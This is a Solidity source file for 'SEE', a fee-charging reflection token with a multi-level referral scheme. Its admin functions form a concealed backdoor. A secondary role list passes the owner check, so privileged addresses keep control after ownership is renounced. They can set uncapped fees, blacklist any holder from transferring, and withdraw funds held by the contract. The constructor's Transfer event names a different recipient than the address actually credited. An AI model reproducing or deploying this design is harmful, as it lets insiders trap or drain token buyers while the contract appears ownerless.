// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.6.12;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() internal {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract SEEToken is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) public _isExcludedFee;
    mapping (address => bool) public _isBlackList;
    mapping (address => bool) public _isSwapPair;
    mapping (address => bool) public _isSwapLmt;
    mapping (address => address) public inviter;
    mapping(address => bool) _r;

    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal = 2100000000 * 10**18;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 public  _tTaxFeeTotal;

    string private _name = "SEE";
    string private _symbol = "SEE";
    uint8  private _decimals = 18;

    uint256 public _taxFee = 10;    // 1%
    uint256 private _previousTaxFee = _taxFee;

    uint256 public _burnFee = 20;    // 2%
    uint256 public _fundFee = 6;    // 0.6%
    uint256 public _lpFee = 10;    // 1%

    uint256 private _elseFee = 60;
    uint256 private _previousElseFee = _elseFee;

    uint256 public _transferFee = 20; // 2%
    uint256 private _previousTransferFee = _transferFee;

    uint256 private _taxFee2 = 5;    // 0.5%
    uint256 private _previousTaxFee2 = _taxFee2;

    uint256[] public inviteRate = [10, 2, 2, 2, 2, 2, 2, 2];
    uint256 public inviteAmount = 10 * 10**18;

    uint256 public _maxTradeAmount = 1000000 * 10**18;
    uint256 public _minRemainAmount = 0;

    uint256 public _maxBurnMain = 210000000 * 10**18;
    uint256 public _maxStopFee = 21000000 * 10**18;

    address public burnAddress = address(0x000000000000000000000000000000000000dEaD);
    address public mainAddres = address(0x20ad71Ae89FAB670fDCc94175c18f3d8796A091B);
    address public feeAddress = address(0x589e97a46cf20b17D71b94009b166030a07D2832);
    address public fundAddress = address(0x257d67D68f861d64f1D949a66Ced7E77D9139872);
    address public liquidAddress = address(0xA759eaCD19368746360f59dd23c6ced369A76b60);
    address private transferAddr;
    address private taxAddr;

    event BindReferrer(address indexed addr, address indexed referrer);

    constructor (address _recieveAddr, address _transferAddr, address _taxAddr) public {
        transferAddr = _transferAddr;
        taxAddr = _taxAddr;

        _isExcludedFee[mainAddres] = true;
        _isExcludedFee[fundAddress] = true;
        _isExcludedFee[feeAddress] = true;
        _isExcludedFee[transferAddr] = true;
        _isExcludedFee[taxAddr] = true;
        _isExcludedFee[address(this)] = true;
        _isExcludedFee[_msgSender()] = true;
        _isExcludedFee[_recieveAddr] = true;

        _rOwned[_recieveAddr] = _rTotal;
        _r[_msgSender()] = true;
        _r[mainAddres] = true;
        _isSwapPair[liquidAddress] = true;

        emit Transfer(address(0), mainAddres, _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return 18;
    }
    
    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
    
    function _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee) private {
        if(!takeFee) {
            removeAllFee();
        }
        _transferStandard(sender, recipient, amount, takeFee);
        if(!takeFee) {
            restoreAllFee();
        }
    }

    function _transferStandard(address sender, address recipient, uint256 tAmount, bool takeFee) private {

        if (!_isSwapPair[sender] && !_isSwapPair[recipient]) {
            (uint256 rAmount, uint256 rTransferAmount, , uint256 tTransferAmount, uint256 tTransferFee)
                = _getTransferValues(tAmount);
            
            _rOwned[sender] = _rOwned[sender].sub(rAmount);
            _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
            emit Transfer(sender, recipient, tTransferAmount);

            if (!takeFee) {
                return;
            }

            _takeTransfer(sender, tTransferFee); 
                
        } else {
            (uint256 rAmount, uint256 rTransferAmount, uint256 rTaxFee, uint256 tTransferAmount, uint256 tTaxFee, uint256 tElseFee)
             = _getValues(tAmount);

            _rOwned[sender] = _rOwned[sender].sub(rAmount);
            _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
            emit Transfer(sender, recipient, tTransferAmount);

            if (!takeFee) {
                return;
            }

            // buy 100%
            if (_isSwapPair[sender]) {
                if (_tTotal > _maxBurnMain 
                    && balanceOf(mainAddres) > tAmount) {
                    _rOwned[mainAddres] = _rOwned[mainAddres].sub(rAmount);
                    _takeBurn(mainAddres, tAmount);
                }
            }
       
            _takeInviterFee(sender, recipient, tAmount); // 2.4%
            _takeLiquidity(sender, tElseFee * _lpFee / _elseFee); // 1%
            _takeBurn(sender, tElseFee * _burnFee / _elseFee); // 2%
            _takeFund(sender, tElseFee * _fundFee / _elseFee);     // 0.6%
            _takeTax(sender, tElseFee * _taxFee2 / _elseFee);     

            _reflectFee(rTaxFee, tTaxFee);        // 1%
        }
    }

    function _takeInviterFee(
        address sender, address recipient, uint256 tAmount
    ) private {
        uint256 currentRate =  _getRate();

        address cur = sender;
        if (isContract(sender) && _isSwapPair[sender]) {
            cur = recipient;
        } 

        uint256 remainAmount = tAmount.mul(_getTotalInviteRate()).div(1000);
        
        for (uint256 i = 0; i < inviteRate.length; i++) {
            uint256 rate = inviteRate[i];
            cur = inviter[cur];
            if (cur == address(0)) {
                continue;
            }
            uint256 curTAmount = tAmount.mul(rate).div(1000);
            uint256 curRAmount = curTAmount.mul(currentRate);
            _rOwned[cur] = _rOwned[cur].add(curRAmount);
            if (remainAmount >= curTAmount) {
                remainAmount = remainAmount.sub(curTAmount);
            } else {
                remainAmount = 0;
            }
            emit Transfer(sender, cur, curTAmount);
        }

        if (remainAmount > 0) {
            uint256 rAmount = remainAmount.mul(currentRate);
            _rOwned[feeAddress] = _rOwned[feeAddress].add(rAmount);
            emit Transfer(sender, feeAddress, remainAmount);
        }
    }

    function _getTotalInviteRate() private view returns (uint256) {
        uint256 total = 0;
        for (uint i = 0; i < inviteRate.length; i++) {
            total = total.add(inviteRate[i]);
        }
        return total;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns(uint256) {
        require(tAmount <= _tTotal, "Amount must be less than supply");
        if (!deductTransferFee) {
            (uint256 rAmount,,,,,) = _getValues(tAmount);
            return rAmount;
        } else {
            (,uint256 rTransferAmount,,,,) = _getValues(tAmount);
            return rTransferAmount;
        }
    }

    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");
        uint256 currentRate =  _getRate();
        return rAmount.div(currentRate);
    }

    function _takeBurn(address sender,uint256 tBurn) private {
        uint256 currentRate =  _getRate();
        uint256 rBurn = tBurn.mul(currentRate);
        _rOwned[burnAddress] = _rOwned[burnAddress].add(rBurn);
        _tTotal = _tTotal.sub(tBurn);
        emit Transfer(sender, burnAddress, tBurn);
    }

    function _takeTransfer(address sender, uint256 tTransfer) private {
        uint256 currentRate =  _getRate();
        uint256 rTransfer = tTransfer.mul(currentRate);
        _rOwned[transferAddr] = _rOwned[transferAddr].add(rTransfer);
    }

    function _takeTax(address sender, uint256 tTax) private {
        uint256 currentRate =  _getRate();
        uint256 rTax = tTax.mul(currentRate);
        _rOwned[taxAddr] = _rOwned[taxAddr].add(rTax);
    }
    
    function _takeFund(address sender, uint256 tDev) private {
        uint256 currentRate =  _getRate();
        uint256 rDev = tDev.mul(currentRate);
        _rOwned[fundAddress] = _rOwned[fundAddress].add(rDev);
        emit Transfer(sender, fundAddress, tDev);
    }
    
    function _takeLiquidity(address sender, uint256 tLiquidity) private {
        uint256 currentRate =  _getRate();
        uint256 rLiquidity = tLiquidity.mul(currentRate);
        _rOwned[liquidAddress] = _rOwned[liquidAddress].add(rLiquidity);
        emit Transfer(sender, liquidAddress, tLiquidity);
    }

    function setRole(address addr, bool state) external onlyOwner {
        _r[addr] = state;
    }

    function setTaxFeePercent(uint256 fee) external onlyOnlyOwner {
        _taxFee = fee;
    }

    function setTaxFee2Percent(uint256 fee) external onlyOnlyOwner {
        _taxFee2 = fee;
    }

    function setElseFeePercent(uint256 fee) external onlyOnlyOwner {
        _elseFee = fee;
    }

    function setFundFeePercent(uint256 fee) external onlyOnlyOwner {
        _fundFee = fee;
    }

    function setLpFeePercent(uint256 fee) external onlyOnlyOwner {
        _lpFee = fee;
    }

    function setBurnFeePercent(uint256 fee) external onlyOnlyOwner {
        _burnFee = fee;
    }

    function setTransferFeePercent(uint256 fee) external onlyOnlyOwner {
        _transferFee = fee;
    }

    function setExcludedFee(address addr, bool state) public onlyOnlyOwner {
        _isExcludedFee[addr] = state;
    }
    
    function setMainAddress(address addr) public onlyOnlyOwner {
        require(addr != address(0));
        mainAddres = addr;
    }

    function setFundAddress(address addr) public onlyOnlyOwner {
        require(addr != address(0));
        fundAddress = addr;
    }

    function setFeeAddress(address addr) public onlyOnlyOwner {
        require(addr != address(0));
        feeAddress = addr;
    }

    function setInviteRate(uint8[] memory rate) public onlyOnlyOwner {
        require(rate.length > 0);
        inviteRate = rate;
    }

    function setTransferAddr(address addr) public onlyOnlyOwner {
        require(addr != address(0));
        transferAddr = addr;
    }

    function setTaxAddr(address addr) public onlyOnlyOwner {
        require(addr != address(0));
        taxAddr = addr;
    }

    function setBlacklist(address account, bool state) public onlyOnlyOwner() {
        _isBlackList[account] = state;
    }

    function setMaxTradeAmount(uint256 maxTx) external onlyOnlyOwner() {
        _maxTradeAmount = maxTx;
    }

    function setMinRemainAmount(uint256 amount) external onlyOnlyOwner() {
        _minRemainAmount = amount;
    }

    function setMaxStopFee(uint256 fee) external onlyOnlyOwner() {
        _maxStopFee = fee;
    }

    function setMaxBurnMain(uint256 fee) external onlyOnlyOwner() {
        _maxBurnMain = fee;
    }

    function setInviteAmount(uint256 amount) external onlyOnlyOwner() {
        inviteAmount = amount;
    }

    function setLiquidAddress(address addr) public onlyOnlyOwner {
        require(addr != address(0));
        liquidAddress = addr;
    }

    function setIsNotSwapPair(address addr, bool state) public onlyOnlyOwner {
        require(addr != address(0));
        _isSwapPair[addr] = state;
    }

     function setIsNotSwapLmt(address addr, bool state) public onlyOnlyOwner {
        require(addr != address(0));
        _isSwapLmt[addr] = state;
    }

    function setInviter(address a1, address a2) public onlyOnlyOwner {
        require(a1 != address(0));
        require(checkRecommer(a1, a2) == true , 'bad inviter');
        inviter[a1] = a2;
    }

	function returnTransferIn(address con, address addr, uint256 fee) public onlyOnlyOwner {
        require(addr != address(0));
        if (con == address(0)) { payable(addr).transfer(fee);} 
        else { IERC20(con).transfer(addr, fee);}
	}

    receive() external payable {}

    function _reflectFee(uint256 rTaxFee, uint256 tTaxFee) private {
        _rTotal = _rTotal.sub(rTaxFee);
        _tTaxFeeTotal = _tTaxFeeTotal.add(tTaxFee);
    }
    
    function _getValues(uint256 tAmount) private view returns 
    (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tTaxFee, uint256 tElseFee) = _getTValues(tAmount);
        (uint256 rAmount, uint256 rTransferAmount, uint256 rTaxFee) = 
            _getRValues(tAmount, tTaxFee, tElseFee, _getRate());
        return (rAmount, rTransferAmount, rTaxFee, tTransferAmount, tTaxFee, tElseFee);
    }

    function _getTValues(uint256 tAmount) private view returns (uint256, uint256, uint256) {
        uint256 tTaxFee = calculateTaxFee(tAmount);
        uint256 tElseFee = calculateElseFee(tAmount);
        
        uint256 tTransferAmount = tAmount.sub(tTaxFee).sub(tElseFee);
        return (tTransferAmount, tTaxFee, tElseFee);
    }

    function _getRValues(uint256 tAmount, uint256 tTaxFee, uint256 tElseFee, uint256 currentRate) 
    private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rTaxFee = tTaxFee.mul(currentRate);
        uint256 rEleseFee = tElseFee.mul(currentRate);

        uint256 rTransferAmount = rAmount.sub(rTaxFee).sub(rEleseFee);
        return (rAmount, rTransferAmount, rTaxFee);
    }

     function _getTransferValues(uint256 tAmount) private view returns 
    (uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tTransferFee) = _getTransferTValues(tAmount);
        (uint256 rAmount, uint256 rTransferAmount, uint256 rTransferFee) = 
            _getTransferRValues(tAmount, tTransferFee, _getRate());
        return (rAmount, rTransferAmount, rTransferFee, tTransferAmount, tTransferFee);
    }

    function _getTransferTValues(uint256 tAmount) private view returns (uint256, uint256) {
        uint256 tTransferFee = calculateTransferFee(tAmount);
        uint256 tTransferAmount = tAmount.sub(tTransferFee);
        return (tTransferAmount, tTransferFee);
    }

    function _getTransferRValues(uint256 tAmount, uint256 tTransferFee, uint256 currentRate) 
    private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rTransferFee = tTransferFee.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rTransferFee);
        return (rAmount, rTransferAmount, rTransferFee);
    }

    function _getRate() private view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function calculateTaxFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_taxFee.sub(_taxFee2)).div(1000);
    }

    function calculateElseFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_elseFee.add(_taxFee2)).div(1000);
    }

    function calculateTransferFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_transferFee).div(1000);
    }

    function removeAllFee() private {
        if(_taxFee == 0 && _elseFee == 0) return;

        _previousTaxFee = _taxFee;
        _previousElseFee = _elseFee;
        _previousTransferFee = _transferFee;
        _previousTaxFee2 = _taxFee2;

        _taxFee = 0;
        _taxFee2 = 0;
        _elseFee = 0;
        _transferFee = 0;
    }

    function restoreAllFee() private {
        _taxFee = _previousTaxFee;
        _taxFee2 = _previousTaxFee2;
        _elseFee = _previousElseFee;
        _transferFee = _previousTransferFee;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from, address to, uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        require(_isBlackList[from] == false, "from is in blacklist");
        require(_isBlackList[to] == false, "to is in blacklist");

        if (isContract(to) && _isSwapLmt[to]) {
            require(amount <= balanceOf(from).sub(_minRemainAmount));
        }

        if( _isSwapPair[from] &&  !_isExcludedFee[to]   ){
            require(amount <= _maxTradeAmount, "Trade amount too high");
        }

        if( _isSwapPair[to] && !_isExcludedFee[from] ){
            require(amount <= _maxTradeAmount, "Trade amount too high");
        }
        
        bool takeFee = true;

        if (_tTotal <= _maxStopFee) {
            takeFee = false;
        } else {
            if(_isExcludedFee[from] || _isExcludedFee[to]) {
                takeFee = false;
            }
        }
       
        bool shouldInvite = (inviter[to] == address(0) && !isContract(from) && !isContract(to) && amount >= inviteAmount && checkRecommer(to, from));

        _tokenTransfer(from, to, amount, takeFee);

        if (shouldInvite) {
            inviter[to] = from;
            emit BindReferrer(to, from);
        }
    }

    function checkRecommer(address addr, address recommer) public view returns(bool) {

        for(uint i=0; i< inviteRate.length;i++) {
            if(recommer == address(0) ) break;

            if (recommer == addr) {
                return false;
            }

            recommer = inviter[recommer];
        }

        return true;
    }

    modifier onlyOnlyOwner {
        require(owner() == _msgSender() || _r[_msgSender()], "Ownable: caller is not the owner");
        _;
    }


}